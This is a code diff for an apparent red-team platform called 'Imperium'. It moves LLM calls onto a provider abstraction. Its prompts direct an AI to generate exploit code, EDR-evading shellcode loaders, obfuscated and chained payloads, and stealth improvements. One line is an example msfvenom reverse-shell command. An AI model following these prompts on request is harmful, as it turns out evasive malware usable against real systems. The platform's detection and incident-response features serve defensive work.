@@ -1,11 +1,13 @@
 import { GoogleGenerativeAI } from "@google/generative-ai";
 import { PrismaClient } from "@prisma/client";
-import { GenerationParams, CodeLanguage, ObfuscationTechnique, AttackType, TargetOS, VaultItem, TargetEnvironment, ShellcodeParams, SiemConfig, DetectIQOutput } from '../types/index.js';
+import { GenerationParams, CodeLanguage, ObfuscationTechnique, AttackType, TargetOS, VaultItem, TargetEnvironment, ShellcodeParams, SiemConfig, DetectIQOutput, LLMProvider } from '../types/index.js';
 import * as mcpService from './mcpService.js';
+import { getProviderFromModel, getProvider, ILLMProvider } from './llm/index.js';
 
 let ai: GoogleGenerativeAI;
 const prisma = new PrismaClient();
 
+// Legacy initialization for backwards compatibility
 const initializeAi = () => {
     if (!process.env.API_KEY) {
         throw new Error("API_KEY environment variable not set");
@@ -13,6 +15,11 @@ const initializeAi = () => {
     if (!ai) {
         ai = new GoogleGenerativeAI(process.env.API_KEY);
     }
+};
+
+// Get provider based on model name (auto-detect Gemini vs Claude)
+const getAiProvider = (modelName: string): ILLMProvider => {
+    return getProviderFromModel(modelName);
 };
 
 const cleanCodeResponse = (text: string): string => {
@@ -39,8 +46,7 @@ const cleanJsonResponse = (text: string): any => {
 }
 
 export const generateCode = async (params: GenerationParams, modelName: string, vulnerabilityDetails?: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const { objective, attackType, language, target } = params;
 
     let prompt = `You are Imperium, a world-class AI for offensive security and red teaming. Your task is to generate code for penetration testing and threat emulation. The code must be safe and intended for authorized, ethical use in controlled environments ONLY.`;
@@ -72,7 +78,7 @@ export const generateCode = async (params: GenerationParams, modelName: string, 
           **Programming Language:** ${language}
         `;
     }
-    
+
     if (attackType === AttackType.LOLBAS) {
         prompt += `\n**Constraint:** The generated script MUST exclusively use built-in "Living Off The Land" binaries and scripts (LOLBAS/GTFOBins) for the target OS (${target.os}). Do not use any techniques that require downloading external tools or compiling custom code on the target.`;
     } else if (attackType === AttackType.MULTI_STAGE_PAYLOAD) {
@@ -82,9 +88,8 @@ export const generateCode = async (params: GenerationParams, modelName: string, 
     prompt += `\nGenerate the code based on these specifications. Provide only the raw code inside a single code block, without any explanations, warnings, or preamble. The code must be functional and follow best practices for the specified language.`;
 
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return cleanCodeResponse(response.text());
+        const response = await provider.generateContent(prompt);
+        return cleanCodeResponse(response);
     } catch (error) {
         console.error("Error generating exploit code:", error);
         return `// Error: Could not generate code. Please check your API key and network connection.\n// Details: ${error instanceof Error ? error.message : String(error)}`;
@@ -92,8 +97,7 @@ export const generateCode = async (params: GenerationParams, modelName: string, 
 };
 
 export const generateThreatHuntCode = async (objective: string, language: CodeLanguage, target: TargetEnvironment, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are Imperium, a world-class AI for defensive security and threat hunting. Your task is to generate scripts and queries to detect malicious activity.
 
@@ -112,9 +116,8 @@ export const generateThreatHuntCode = async (objective: string, language: CodeLa
     `;
 
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return cleanCodeResponse(response.text());
+        const response = await provider.generateContent(prompt);
+        return cleanCodeResponse(response);
     } catch (error) {
         console.error("Error generating threat hunt code:", error);
         return `// Error: Could not generate code. Please check your API key and network connection.\n// Details: ${error instanceof Error ? error.message : String(error)}`;
@@ -122,8 +125,7 @@ export const generateThreatHuntCode = async (objective: string, language: CodeLa
 };
 
 export const generateLoader = async (payload: string, language: CodeLanguage, target: TargetEnvironment, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are Imperium, an expert in malware development and EDR evasion techniques.
       Your task is to generate a loader in ${language} to execute the provided raw payload/shellcode.
@@ -147,9 +149,8 @@ export const generateLoader = async (payload: string, language: CodeLanguage, ta
       Generate the complete, functional loader code in ${language}. Provide only the raw code in a single code block, with no explanations or preamble.
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return cleanCodeResponse(response.text());
+        const response = await provider.generateContent(prompt);
+        return cleanCodeResponse(response);
     } catch (error) {
         console.error("Error generating loader:", error);
         return `// Error generating loader: ${error instanceof Error ? error.message : String(error)}`;
@@ -157,8 +158,7 @@ export const generateLoader = async (payload: string, language: CodeLanguage, ta
 };
 
 export const refineCode = async (code: string, language: CodeLanguage, instruction: string, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are an expert code refactoring AI. A user has selected a portion of their code and provided an instruction to modify it.
       Your task is to rewrite ONLY the provided code snippet based on the instruction. Do not change the overall logic unless requested.
@@ -175,9 +175,8 @@ export const refineCode = async (code: string, language: CodeLanguage, instructi
       **Refactored Code Snippet:**
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return cleanCodeResponse(response.text());
+        const response = await provider.generateContent(prompt);
+        return cleanCodeResponse(response);
     } catch (error) {
         console.error("Error refining code:", error);
         return `// Error refining code: ${error}`;
@@ -185,8 +184,7 @@ export const refineCode = async (code: string, language: CodeLanguage, instructi
 };
 
 export const chainPayloads = async (payloads: VaultItem[], language: CodeLanguage, target: TargetEnvironment, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const payloadSummaries = payloads.map((p, i) => `
       **Payload ${i + 1} (${p.params.language}):**
       - Objective: ${p.params.objective}
@@ -194,7 +192,7 @@ export const chainPayloads = async (payloads: VaultItem[], language: CodeLanguag
       \
       ${p.code}
       \
-    `).join('\n'); // Corrected escaping for \n
+    `).join('\n');
 
     const prompt = `
       You are a payload chaining expert. Your task is to combine multiple payloads into a single, cohesive script in the target language.
@@ -202,7 +200,7 @@ export const chainPayloads = async (payloads: VaultItem[], language: CodeLanguag
 
       **Target Language for Final Payload:** ${language}
       **Target Environment:** ${target.os} ${target.architecture}
-      
+
       **Payloads to Chain:**
       ${payloadSummaries}
 
@@ -214,9 +212,8 @@ export const chainPayloads = async (payloads: VaultItem[], language: CodeLanguag
       5.  Return only the final, raw code in a single code block. Do not add explanations.
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return cleanCodeResponse(response.text());
+        const response = await provider.generateContent(prompt);
+        return cleanCodeResponse(response);
     } catch (error) {
         console.error("Error chaining payloads:", error);
         return `// Error chaining payloads: ${error}`;
@@ -224,37 +221,35 @@ export const chainPayloads = async (payloads: VaultItem[], language: CodeLanguag
 };
 
 export const generateShellcode = async (params: ShellcodeParams, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
         You are a Metasploit Framework expert. Your task is to generate the command to create shellcode using msfvenom based on the user's request, and then show the expected output.
-        
+
         **MSFVenom Parameters:**
         - Payload (p): ${params.shellType}
         - LHOST: ${params.lhost}
         - LPORT: ${params.lport}
         - Encoder (e): ${params.encoder}
         - Format (f): ${params.outputFormat}
-        
+
         **Instructions:**
         1. Construct the precise msfvenom command.
         2. Provide a realistic, sample output of the generated shellcode in the requested format.
         3. Format the output clearly, first showing the command in a shell block, then the output in the correct language code block.
         4. Do not add any extra explanations.
-        
+
         **Example:**
         \
         \
         msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f c -e x64/xor
         \
         \
-        
+
         unsigned char buf[] =
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("Error generating shellcode:", error);
         return `// Error generating shellcode.`;
@@ -262,30 +257,28 @@ export const generateShellcode = async (params: ShellcodeParams, modelName: stri
 };
 
 export const obfuscateCode = async (code: string, language: CodeLanguage, techniques: ObfuscationTechnique[], level: number, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are an expert in code obfuscation and EDR evasion. Your task is to obfuscate the given code snippet.
-      
+
       **Programming Language:** ${language}
       **Obfuscation Techniques to Apply:** ${techniques.join(', ') || 'General, common techniques'}
       **Obfuscation Intensity (1-3):** ${level}
-      
+
       **Instructions:**
       - Apply the requested obfuscation techniques to the code.
       - The intensity level should determine the complexity and layers of obfuscation. Level 3 should be significantly harder to analyze than Level 1.
       - The final code must remain functionally identical to the original.
       - Return only the raw, obfuscated code in a single code block. Do not provide explanations.
-      
+
       **Original Code:**
       \
       ${code}
       \
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return cleanCodeResponse(response.text());
+        const response = await provider.generateContent(prompt);
+        return cleanCodeResponse(response);
     } catch (error) {
         console.error("Error obfuscating code:", error);
         return `// Error during obfuscation: ${error}`;
@@ -293,38 +286,36 @@ export const obfuscateCode = async (code: string, language: CodeLanguage, techni
 };
 
 export const analyzeExecutionLog = async (log: string, code: string, params: GenerationParams, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are a senior security analyst specializing in incident response and malware analysis.
       A script was executed in a simulated environment, and you need to analyze the output log.
-      
+
       **Objective of the script:** ${params.objective}
       **Programming Language:** ${params.language}
       **Target OS:** ${params.target.os}
-      
+
       **Original Code:**
       \
       ${code}
       \
-      
+
       **Execution Log:**
       \
       ${log}
       \
-      
+
       **Analysis Task:**
       1.  **Determine Success:** Did the script successfully achieve its objective based on the log?
       2.  **Identify IoCs:** List any Indicators of Compromise (IoCs) generated (e.g., file paths, registry keys, network connections).
       3.  **Suggest Improvements:** Recommend specific code modifications to make the script stealthier, more effective, or more resilient.
       4.  **Detection & Forensics:** How would a defender detect this activity on an endpoint? What forensic artifacts would be left behind?
-      
+
       Format your response as a concise markdown report.
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("Error analyzing log:", error);
         return `### Analysis Error\nCould not analyze log.`;
@@ -332,46 +323,44 @@ export const analyzeExecutionLog = async (log: string, code: string, params: Gen
 };
 
 export const analyzeThreatHuntLog = async (
-    log: string, 
-    code: string, 
-    params: GenerationParams, 
+    log: string,
+    code: string,
+    params: GenerationParams,
     modelName: string
 ): Promise<any> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
-    
+    const provider = getAiProvider(modelName);
+
     const prompt = `
       You are a senior detection engineer and threat hunter.
       A threat hunting script was executed in a simulated environment. Your task is to analyze the output log and provide recommendations to improve the script.
-      
+
       **CRITICAL INSTRUCTION:** Your recommendations MUST focus ONLY on **Effectiveness** (improving the script's ability to find threats) and **Resilience** (improving error handling, logging, and usability).
       DO NOT suggest improvements related to stealth, evasion, or obfuscation.
-      
+
       **Objective of the script:** ${params.objective}
       **Programming Language:** ${params.language}
-      
+
       **Original Code:**
       \
       ${code}
       \
-      
+
       **Execution Log:**
       \
       ${log}
       \
-      
+
       **Analysis Task:**
       1.  **Summarize Findings:** Briefly summarize whether the script was successful and what it found.
       2.  **Suggest Improvements:** Provide specific, actionable code improvement suggestions categorized under "Effectiveness" or "Resilience".
           - **Effectiveness examples:** Expanding scope to find other techniques, adding recursive analysis, improving query logic to reduce false positives.
           - **Resilience examples:** Adding error handling, adding a ComputerName parameter for remote execution, improving output logging for failed actions.
-      
+
       You must return your analysis as a single JSON object. Do not wrap it in a markdown block. The JSON should have 'analysisSummary' and 'improvements' keys.
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return cleanJsonResponse(response.text());
+        const response = await provider.generateContent(prompt);
+        return cleanJsonResponse(response);
     } catch (error) {
         console.error("Error analyzing threat hunt log:", error);
         throw new Error(`Failed to analyze threat hunt log. ${error instanceof Error ? error.message : ''}`);
@@ -379,13 +368,12 @@ export const analyzeThreatHuntLog = async (
 };
 
 export const performOsintAnalysis = async (target: string, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are an OSINT (Open-Source Intelligence) expert. Your task is to generate an OSINT report for the given target.
-      
+
       **Target:** ${target}
-      
+
       **Instructions:**
       **Role:** You are an autonomous AI OSINT Investigator. Your goal is to conduct deep-dive research into a target (Individual, Domain, Organization, or Location) by following a strict 5-Phase Modular Investigation Flow Chart.
       **Operational Constraint:** You must follow a "Recursive Pivot" logic. If Phase 3 (Pivot Point Analysis) identifies a new selector (e.g., a newly discovered email or IP), you must restart the process from Phase 1 for that specific selector while maintaining the context of the overall investigation.
@@ -417,9 +405,8 @@ export const performOsintAnalysis = async (target: string, modelName: string): P
       - Format the output as a markdown report. Use bolding and bullet points for clarity.
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("OSINT analysis error:", error);
         return `### OSINT Error\nCould not perform analysis.`;
@@ -511,28 +498,26 @@ export const performAdvancedOsintAnalysis = async (target: string, modelName: st
 
 
 export const analyzeVulnerabilityScan = async (scanData: string, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are a vulnerability assessment analyst. A raw vulnerability scan output has been provided.
-      
+
       **Scan Data:**
       \
       ${scanData}
       \
-      
+
       **Task:**
       1.  **Parse the Data:** Identify the key vulnerabilities from the raw text.
       2.  **Prioritize:** Rank the vulnerabilities from most to least critical based on likely impact and exploitability.
       3.  **Suggest Exploits:** For the top 2-3 vulnerabilities, suggest specific public exploits, Metasploit modules, or attack techniques that could be used.
       4.  **Summarize:** Provide a brief executive summary.
-      
+
       Format as a markdown report.
     `;
-     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+    try {
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("Scan analysis error:", error);
         return `### Scan Analysis Error\nCould not perform analysis.`;
@@ -540,11 +525,10 @@ export const analyzeVulnerabilityScan = async (scanData: string, modelName: stri
 };
 
 export const analyzeSpiderfootJson = async (jsonData: string, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are an OSINT analyst specializing in Spiderfoot. You have been given the JSON output from a scan.
-      
+
       **Task:**
       1.  **Summarize Key Findings:** Ingest the provided JSON data. Do not show the raw JSON in your response.
       2.  **Identify High-Value Information:** Extract and list the most important pieces of information for a penetration tester, such as:
@@ -554,18 +538,17 @@ export const analyzeSpiderfootJson = async (jsonData: string, modelName: string)
           - Software and technologies identified.
           - Interesting files or metadata.
       3.  **Formulate Next Steps:** Based on the findings, suggest 3-5 concrete next steps for the reconnaissance or initial access phase of an engagement.
-      
+
       Format the output as a clean, readable markdown report.
-      
+
       **Spiderfoot JSON Data:**
       \
       ${jsonData}
       \
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("Spiderfoot analysis error:", error);
         return `### Spiderfoot Analysis Error\nCould not perform analysis.`;
@@ -573,11 +556,10 @@ export const analyzeSpiderfootJson = async (jsonData: string, modelName: string)
 };
 
 export const analyzeJavaScriptCode = async (jsCode: string, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are a security researcher specializing in client-side code analysis. You have been given a snippet of JavaScript, likely from a web application's frontend.
-      
+
       **Task:**
       1.  **Static Analysis:** Analyze the code for potential security vulnerabilities and interesting information.
       2.  **Identify Key Information:** Look for and list the following:
@@ -587,18 +569,17 @@ export const analyzeJavaScriptCode = async (jsCode: string, modelName: string): 
           - Potentially vulnerable functions (e.g., usage of \`eval()\`, \`innerHTML\`, etc.).
           - Logic related to user authentication or authorization.
       3.  **Summarize Risk:** Provide a summary of the findings and the potential security risks they pose.
-      
+
       Format your response as a markdown report.
-      
+
       **JavaScript Code:**
       \
       ${jsCode}
       \
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("JS analysis error:", error);
         return `### JS Analysis Error\nCould not perform analysis.`;
@@ -606,8 +587,7 @@ export const analyzeJavaScriptCode = async (jsCode: string, modelName: string): 
 };
 
 export const parseNaturalLanguageCommand = async (command: string, modelName: string): Promise<Partial<GenerationParams & { obfuscationLevel: number; obfuscationTechniques: ObfuscationTechnique[] }> | null> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
 
     const prompt = `
       Parse the user's natural language command into a structured JSON object for the Imperium C2 code generator.
@@ -615,17 +595,15 @@ export const parseNaturalLanguageCommand = async (command: string, modelName: st
       - Map the request to the closest AttackType.
       - Choose the best programming language for the task and target OS.
       - Default to a common OS version if not specified.
-      - If the user mentions "stealthy", "hidden", or "obfuscated", set the obfuscation level between 1 and 3.      
+      - If the user mentions "stealthy", "hidden", or "obfuscated", set the obfuscation level between 1 and 3.
       **Command:** "${command}"
 
       You must return a single JSON object. Do not wrap it in a markdown block.
     `;
 
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return cleanJsonResponse(response.text());
-
+        const response = await provider.generateContent(prompt);
+        return cleanJsonResponse(response);
     } catch (error) {
         console.error("Error parsing natural language command:", error);
         return null;
@@ -633,8 +611,7 @@ export const parseNaturalLanguageCommand = async (command: string, modelName: st
 };
 
 export const simulateCodeExecution = async (code: string, params: GenerationParams, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
         You are a computer simulation expert. Your task is to predict the output and behavior of a script if it were run on the specified target system.
         Do not actually execute the code. Instead, generate a realistic, plausible log of what *would* happen.
@@ -658,9 +635,8 @@ export const simulateCodeExecution = async (code: string, params: GenerationPara
         6.  The output should mimic a real terminal or log file. Do not add any meta-commentary.
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("Error simulating code execution:", error);
         return `// Simulation Error: ${error}`;
@@ -668,8 +644,7 @@ export const simulateCodeExecution = async (code: string, params: GenerationPara
 };
 
 export const performEvasionAnalysis = async (code: string, language: CodeLanguage, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
         You are a senior EDR (Endpoint Detection and Response) analyst and reverse engineer.
         Your task is to analyze a piece of code from an offensive security perspective and assess its likelihood of being detected by modern security products.
@@ -689,9 +664,8 @@ export const performEvasionAnalysis = async (code: string, language: CodeLanguag
         Format your response as a concise markdown report.
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("Error analyzing evasion:", error);
         return `### Analysis Error\nCould not analyze code for evasion.`;
@@ -699,8 +673,7 @@ export const performEvasionAnalysis = async (code: string, language: CodeLanguag
 };
 
 export const applyAnalysisRecommendations = async (code: string, analysis: string, params: GenerationParams, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
         You are an expert programmer specializing in secure and stealthy coding.
         You have been given a piece of code and an analysis report that suggests improvements.
@@ -721,9 +694,8 @@ export const applyAnalysisRecommendations = async (code: string, analysis: strin
         4.  Return only the raw, updated code in a single code block. Do not include explanations or comments about what you changed.
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return cleanCodeResponse(response.text());
+        const response = await provider.generateContent(prompt);
+        return cleanCodeResponse(response);
     } catch (error) {
         console.error("Error applying recommendations:", error);
         return `// Error applying recommendations: ${error}`;
@@ -732,8 +704,7 @@ export const applyAnalysisRecommendations = async (code: string, analysis: strin
 
 
 export const planMission = async (objective: string, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are Imperium, an advanced Offensive Security Architect. Your mission is to decompose a high-level objective into a professional, end-to-end offensive security plan.
 
@@ -743,16 +714,16 @@ Phase Logic: Create a chronological plan following the MITRE ATT&CK framework, c
 Payload Specification: For each technical step, select the most suitable parameters from the available options.
 Scope Assumption: Based on the objective, logically infer the target environment (e.g., Cloud, On-Premise AD, Web Infrastructure) and the likely Operating Systems involved.
 
-      
+
       **Mission Objective:** ${objective}
-      
+
       **Instructions:**
       1.  Break the operation down into logical phases (e.g., Initial Access, Execution, Persistence, etc.).
       2.  For each phase, propose a specific technique.
       3.  For each technique, provide a brief description of the action to be taken.
       4.  For each proposed action, specify the most suitable **Attack Type**, **Language**, and **Target OS** from the available Imperium options to generate the payload for that step.
       5.  Format the output as a markdown list. Use a very specific and parsable format below for each step.
-      
+
       **Strict Output Format per step:**
       *   **Action:** [Brief description of the action]
       *   **Attack Type:** [One of: ${Object.values(AttackType).join(', ')}]
@@ -760,9 +731,8 @@ Scope Assumption: Based on the objective, logically infer the target environment
       *   **Target OS:** [One of: ${Object.values(TargetOS).join(', ')}]
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("Error planning mission:", error);
         return `### Mission Planning Error\nCould not generate plan.`;
@@ -770,8 +740,7 @@ Scope Assumption: Based on the objective, logically infer the target environment
 };
 
 export const fetchVulnerabilityDetails = async (identifier: string, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
         You are a vulnerability intelligence analyst.
         Provide a detailed, technical summary of the vulnerability specified by the identifier.
@@ -788,10 +757,9 @@ export const fetchVulnerabilityDetails = async (identifier: string, modelName: s
 
         Provide a concise summary. Do not include mitigation advice or reference links.
     `;
-     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+    try {
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("Error fetching vulnerability details:", error);
         return `Could not fetch details for ${identifier}.`;
@@ -799,23 +767,21 @@ export const fetchVulnerabilityDetails = async (identifier: string, modelName: s
 };
 
 export const generateExploitFromFinding = async (finding: string, modelName: string): Promise<{ params: Partial<GenerationParams>, code: string }> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
 
     const prompt = `
         From the following reconnaissance finding, generate a proof-of-concept exploit.
         Determine the most appropriate language, attack type, and target OS.
         Then, generate the code to exploit the vulnerability.
-        
+
         **Recon Finding:**
         "${finding}"
 
         Return the result as a JSON object. Do not wrap it in a markdown block. The JSON should have 'language', 'attackType', 'os', and 'code' keys.
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        const parsed = cleanJsonResponse(response.text());
+        const response = await provider.generateContent(prompt);
+        const parsed = cleanJsonResponse(response);
         return {
             params: {
                 language: parsed.language,
@@ -824,7 +790,6 @@ export const generateExploitFromFinding = async (finding: string, modelName: str
             },
             code: parsed.code
         };
-
     } catch (error) {
         console.error("Error generating exploit from finding:", error);
         throw new Error("Could not generate exploit from finding.");
@@ -833,8 +798,7 @@ export const generateExploitFromFinding = async (finding: string, modelName: str
 
 
 export const planDefenceMission = async (objective: string, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are Imperium, a world-class AI for defensive security strategy and architecture.
       Based on a high-level objective, create a plausible, multi-stage security hardening plan.
@@ -854,9 +818,8 @@ export const planDefenceMission = async (objective: string, modelName: string): 
       *   **Target OS:** [One of: ${Object.values(TargetOS).join(', ')}, AWS, Azure, GCP]
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("Error generating defence plan:", error);
         return `// Error: Could not generate plan. Details: ${error instanceof Error ? error.message : String(error)}`;
@@ -864,8 +827,7 @@ export const planDefenceMission = async (objective: string, modelName: string): 
 };
 
 export const generateValidationPlan = async (objective: string, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are Imperium, an AI expert in security control validation and purple teaming.
       Based on a high-level objective to validate security controls, create a structured, multi-stage threat emulation plan.
@@ -898,9 +860,8 @@ export const generateValidationPlan = async (objective: string, modelName: strin
       *   **Target OS:** [Target OS]
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("Error generating validation plan:", error);
         return `### Plan Generation Error\nCould not generate plan.`;
@@ -915,8 +876,7 @@ export const generateDetectionRule = async (
 ): Promise<DetectIQOutput> => {
     console.log('aiService.generateDetectionRule - modelName:', modelName);
     console.log('aiService.generateDetectionRule - siemTarget:', siemTarget);
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
 
     const prompt = `
       You are DetectIQ, an AI-powered detection engineering workbench.
@@ -942,9 +902,8 @@ export const generateDetectionRule = async (
     `;
 
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return cleanJsonResponse(response.text());
+        const response = await provider.generateContent(prompt);
+        return cleanJsonResponse(response);
     } catch (error) {
         console.error("Error in generateDetectionRule:", error);
         throw new Error(`Failed to generate detection rule. ${error instanceof Error ? error.message : ''}`);
@@ -952,11 +911,10 @@ export const generateDetectionRule = async (
 };
 
 export const optimizeDetectionRule = async (
-    existingRule: string, 
+    existingRule: string,
     modelName: string
 ): Promise<DetectIQOutput> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
 
     const prompt = `
       You are DetectIQ, an AI-powered detection engineering workbench.
@@ -981,9 +939,8 @@ export const optimizeDetectionRule = async (
     `;
 
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return cleanJsonResponse(response.text());
+        const response = await provider.generateContent(prompt);
+        return cleanJsonResponse(response);
     } catch (error) {
         console.error("Error in optimizeDetectionRule:", error);
         throw new Error(`Failed to optimize detection rule. ${error instanceof Error ? error.message : ''}`);
@@ -991,11 +948,10 @@ export const optimizeDetectionRule = async (
 };
 
 export const explainDetectionRule = async (
-    rule: string, 
+    rule: string,
     modelName: string
 ): Promise<DetectIQOutput> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
 
     const prompt = `
       You are DetectIQ, an AI-powered detection engineering workbench.
@@ -1017,11 +973,10 @@ export const explainDetectionRule = async (
         "explanation": "<The detailed, natural language explanation of the rule>"
       }
     `;
-    
+
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return cleanJsonResponse(response.text());
+        const response = await provider.generateContent(prompt);
+        return cleanJsonResponse(response);
     } catch (error) {
         console.error("Error in explainDetectionRule:", error);
         throw new Error(`Failed to explain detection rule. ${error instanceof Error ? error.message : ''}`);
@@ -1029,8 +984,7 @@ export const explainDetectionRule = async (
 };
 
 export const generateIrPlan = async (objective: string, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are a Senior Incident Response Analyst, an expert in using the ELK Stack (Elastic Security) and Kibana Query Language (KQL) for threat hunting.
       Your task is to create a structured, multi-stage investigation plan based on a high-level incident description.
@@ -1071,9 +1025,8 @@ export const generateIrPlan = async (objective: string, modelName: string): Prom
       \
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text().trim();
+        const response = await provider.generateContent(prompt);
+        return response.trim();
     } catch (error) {
         console.error("Error generating IR plan:", error);
         return `### IR Plan Generation Error\nCould not generate plan.`;
@@ -1081,8 +1034,7 @@ export const generateIrPlan = async (objective: string, modelName: string): Prom
 };
 
 export const generateIrTabletopScenario = async (objective: string, modelName: string): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are a world-class cybersecurity consultant specializing in incident response (IR) and business continuity planning.
       Your task is to create a detailed, professional, and engaging tabletop exercise scenario based on a user-provided threat.
@@ -1104,9 +1056,8 @@ export const generateIrTabletopScenario = async (objective: string, modelName: s
       Ensure the content is professional, technically accurate, and tailored to the threat description.
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text().trim();
+        const response = await provider.generateContent(prompt);
+        return response.trim();
     } catch (error) {
         console.error("Error generating IR tabletop scenario:", error);
         return `### IR Tabletop Scenario Generation Error\nCould not generate the scenario.`;
@@ -1118,8 +1069,7 @@ export const convertKqlToDsl = async (
     variables: Record<string, string>,
     modelName: string
 ): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     let populatedQuery = kqlQuery;
